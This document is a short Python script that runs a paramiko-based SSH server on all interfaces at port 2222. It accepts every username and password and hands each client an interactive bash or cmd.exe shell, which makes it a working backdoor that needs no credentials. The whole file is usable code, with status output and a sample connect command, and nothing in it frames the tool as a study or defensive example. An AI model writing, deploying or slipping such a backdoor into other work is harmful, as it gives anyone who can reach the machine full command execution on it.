#!/usr/bin/env python3
import socket
import paramiko
import threading
import subprocess
import sys
from pathlib import Path

class Handler(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        return paramiko.AUTH_SUCCESSFUL
    def get_allowed_auths(self, username):
        return 'password'
    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED
    def check_channel_shell_request(self, channel):
        return paramiko.OPEN_SUCCEEDED
    def check_channel_pty_request(self, channel, *args):
        return paramiko.OPEN_SUCCEEDED

def handle_client(client, addr, key):
    print("[+] Client: {}:{}".format(addr[0], addr[1]))
    try:
        transport = paramiko.Transport(client)
        transport.add_server_key(key)
        transport.start_server(server=Handler())
        channel = transport.accept(20)
        if channel is None:
            return
        if sys.platform == 'win32':
            proc = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)
        else:
            proc = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)

        def read_ch():
            try:
                while True:
                    data = channel.recv(1024)
                    if not data: break
                    proc.stdin.write(data)
                    proc.stdin.flush()
            except: pass

        def read_proc():
            try:
                while True:
                    data = proc.stdout.read(1024)
                    if not data: break
                    channel.send(data)
            except: pass
            channel.close()

        t1 = threading.Thread(target=read_ch, daemon=True)
        t2 = threading.Thread(target=read_proc, daemon=True)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    except Exception as e:
        print("[-] Error: {}".format(str(e)))
    finally:
        transport.close()

def main():
    port = 2222
    key_path = Path.home() / '.ssh' / 'ultron_host_key'
    key_path.parent.mkdir(parents=True, exist_ok=True)
    if not key_path.exists():
        key = paramiko.RSAKey.generate(2048)
        key.write_private_key_file(str(key_path))
    else:
        key = paramiko.RSAKey.from_private_key_file(str(key_path))

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', port))
    sock.listen(5)
    print("[*] SSH Server on port {}".format(port))
    print("[*] ssh -p 2222 user@192.168.1.104")
    try:
        while True:
            client, addr = sock.accept()
            threading.Thread(target=handle_client, args=(client, addr, key), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] Shutdown")
    finally:
        sock.close()

if __name__ == '__main__':
    main()
